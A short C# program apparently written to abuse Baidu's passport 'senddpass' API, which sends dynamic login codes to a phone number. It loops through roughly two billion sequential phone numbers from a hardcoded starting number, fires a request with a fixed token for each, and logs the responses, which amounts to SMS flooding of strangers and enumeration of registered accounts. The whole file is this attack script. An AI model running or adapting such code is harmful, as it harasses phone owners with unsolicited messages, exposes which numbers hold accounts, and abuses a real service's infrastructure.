using System;
using System.Collections.Generic;

using System.Text;

namespace baiduphone
{
	class Program
	{
		static void Main(string[] args)
		{
			// https://passport.baidu.com/v2/api/senddpass?username=(电话)&bdstoken=89d312dc77ca7d15d36ab6f7e75135d4&tpl=mn&apiver=v3&tt=1434526580547&callback=bd__cbs__iuasj1
			Int64 phone = 18600161250;
			for (int i = 0;i<2099999999; i++)
			{
				phone++;
				Console.WriteLine(phone);
				gogogo(phone);
			}
		}
		static void gogogo(Int64 phone)
		{
			string url = "";
			string phonestr = phone.ToString();
            		url = string.Format("https://passport.baidu.com/v2/api/senddpass?username={0}&bdstoken=89d312dc77ca7d15d36ab6f7e75135d4&tpl=mn&apiver=v3&tt=1434526580547&callback=bd__cbs__iuasj1", phonestr);
			string result = xiaok.httpGet(url);

			xiaok.log(phone + " " + result);
		}
	}
}
